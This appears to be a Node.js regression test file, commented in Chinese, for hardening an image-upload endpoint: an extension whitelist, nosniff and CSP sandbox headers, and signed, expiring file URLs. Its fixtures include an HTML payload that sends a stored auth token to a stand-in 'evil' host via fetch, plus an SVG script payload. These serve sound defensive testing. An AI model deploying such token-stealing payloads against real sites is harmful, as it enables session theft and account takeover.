/**
 * 上传加固（2026-09-11）。
 *
 * ## 为什么有这条
 *
 * `/api/images/upload` 收文件 → 落进 `DATA_DIR/uploads` → 由
 * `app.use("/uploads", express.static(...))` **同源、无鉴权**地提供出去。
 *
 * 而文件名原来是 `path.extname(originalname).replace(/[^.\w]/g, "")` —— 只过滤
 * 特殊字符，**不过滤类型**。于是 `.html` / `.svg` 都能活着落盘，浏览器按
 * `text/html` 打开它，里面的脚本就能读走 `localStorage['nox-auth-token']`。
 * 一次上传 = 全系统接管（含那条真的会下单的 confirm 端点）。
 *
 * 现在两道防线：扩展名白名单 + 响应头 nosniff / CSP sandbox。
 * 这条测试同时钉住两者 —— 任何一道被拆掉都会红。
 */
import assert from "node:assert/strict";
import test from "node:test";

import { api, startBridge, TOKEN } from "./helpers.js";

let bridge;
const base = () => bridge.base;

test.before(async () => {
  bridge = await startBridge();
});
test.after(async () => {
  await bridge?.stop();
});

/** multipart 上传一个"文件"。api() 只会发 JSON，所以这里手搓。 */
async function upload(name, bytes, type) {
  const fd = new FormData();
  fd.append("file", new Blob([bytes], { type }), name);
  const r = await fetch(`${base()}/api/images/upload`, {
    method: "POST",
    headers: { "X-Nox-Token": TOKEN },
    body: fd,
  });
  let data = null;
  try { data = await r.json(); } catch { /* 出错时可能不是 JSON */ }
  return { status: r.status, data };
}

test("传 .html 上去，落盘的绝不是 .html（扩展名白名单）", async () => {
  const evil = Buffer.from("<script>fetch('//evil/'+localStorage['nox-auth-token'])</script>");
  const { status, data } = await upload("evil.html", evil, "text/html");

  assert.equal(status, 200, `上传本身不该失败，实际 ${status}`);
  assert.ok(data?.url, "没拿到 url");
  // ⚠️ 0.8 之后 URL 尾部带 ?exp=&sig=，所以先摘查询串再验后缀
  const pathOnly = String(data.url).split("?")[0];
  assert.ok(
    !/\.html$/i.test(pathOnly),
    `🔴 落盘文件名还是 .html —— 同源 XSS 回来了：${data.url}`,
  );
  assert.ok(
    /\.(bin|jpg|jpeg|png|gif|webp|heic|heif|bmp|avif)$/i.test(pathOnly),
    `后缀不在白名单里，说明白名单被绕过了：${data.url}`,
  );
});

test("传 .svg 也一样（svg 当文档打开能执行脚本）", async () => {
  const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  const { status, data } = await upload("x.svg", svg, "image/svg+xml");
  assert.equal(status, 200);
  assert.ok(!/\.svg$/i.test(String(data.url).split("?")[0]), `🔴 .svg 活着落盘了：${data.url}`);
});

test("正常图片照旧（不要把功能修坏）", async () => {
  // 一个最小的合法 PNG（1x1 透明）
  const png = Buffer.from(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489" +
    "0000000a49444154789c6300010000050001a5f645400000000049454e44ae426082",
    "hex",
  );
  const { status, data } = await upload("photo.png", png, "image/png");
  assert.equal(status, 200);
  assert.match(String(data.url).split("?")[0], /\.png$/i, `正常 png 被改坏了：${data.url}`);
});

test("/uploads 的响应带 nosniff + CSP sandbox", async () => {
  const png = Buffer.from(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489" +
    "0000000a49444154789c6300010000050001a5f645400000000049454e44ae426082",
    "hex",
  );
  const { data } = await upload("hdr.png", png, "image/png");
  const r = await fetch(`${base()}${data.url}`);

  assert.equal(r.status, 200, "上传的文件应该能取回来（图片要能内联显示）");
  assert.equal(
    r.headers.get("x-content-type-options"),
    "nosniff",
    "缺 nosniff —— 浏览器会嗅探 MIME",
  );
  const csp = r.headers.get("content-security-policy") || "";
  assert.match(csp, /sandbox/, `CSP 里没有 sandbox：${csp}`);
  // 不能加 attachment —— 那会让聊天里的图片变成下载
  assert.equal(r.headers.get("content-disposition"), null, "不该带 Content-Disposition");
});

// ---------------------------------------------------------------------------
// 0.8 下半：签名 URL（2026-09-12 做完）
//
// 这里原来有一条叫「/uploads 依然不需要 token」的测试，写着"记录现状"，
// 并留了一句「变了的话说明 0.8 做完了，删掉这条」。**现在就是那一刻。**
//
// 实测背景：2026-09-10 从公网匿名 GET 一张真实照片，200 / 306KB。
// 她发过的每一张图、每一段录音，只要知道文件名就能拿走。
//
// 为什么是签名而不是 token：`<img src>` 带不了请求头，而把主令牌塞进查询串
// 会进 Caddy/journald 访问日志、浏览器历史、Referer —— 审计点名过。
// ---------------------------------------------------------------------------

const TINY_PNG = Buffer.from(
  "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489" +
  "0000000a49444154789c6300010000050001a5f645400000000049454e44ae426082",
  "hex",
);

test("🔴 不带签名取不到图（这是 0.8 的判据）", async () => {
  const { data } = await upload("private.png", TINY_PNG, "image/png");
  const bare = data.url.split("?")[0];          // 把签名摘掉
  const r = await fetch(`${base()}${bare}`);
  assert.equal(r.status, 403, "裸 URL 必须被拒");
});

test("上传返回的 URL 自带签名，且直接能用", async () => {
  const { data } = await upload("ok.png", TINY_PNG, "image/png");
  assert.match(data.url, /[?&]sig=/, "上传返回的 URL 应该已经签好");
  const r = await fetch(`${base()}${data.url}`);   // 故意不带 token
  assert.equal(r.status, 200, "签过名的 URL 不该再要 token —— <img src> 带不了头");
});

test("签名只授权那一个文件，不能拿去取别的", async () => {
  const a = (await upload("a.png", TINY_PNG, "image/png")).data;
  const b = (await upload("b.png", TINY_PNG, "image/png")).data;
  const nameB = b.url.split("?")[0];
  const sigOfA = a.url.split("?")[1];
  const r = await fetch(`${base()}${nameB}?${sigOfA}`);
  assert.equal(r.status, 403, "🔴 一个签名被拿去开另一个文件 = 等于没有签名");
});

test("过期的签名不认", async () => {
  const { data } = await upload("exp.png", TINY_PNG, "image/png");
  const bare = data.url.split("?")[0];
  const q = new URLSearchParams(data.url.split("?")[1]);
  // 把 exp 改成过去，sig 保持原样 —— 服务端应该先看 exp
  const r = await fetch(`${base()}${bare}?exp=1&sig=${q.get("sig")}`);
  assert.equal(r.status, 403);
});

test("相册列表返回的 URL 也是签好的（否则整个相册是裂图）", async () => {
  await upload("in-gallery.png", TINY_PNG, "image/png");
  const { data } = await api(base(), "/api/gallery/list");
  assert.ok(Array.isArray(data) && data.length, "相册列表不该是空的");
  for (const row of data.slice(0, 5)) {
    if (typeof row.url === "string" && row.url.includes("/uploads/")) {
      assert.match(row.url, /[?&]sig=/, `相册行没签名：${row.url}`);
    }
  }
});
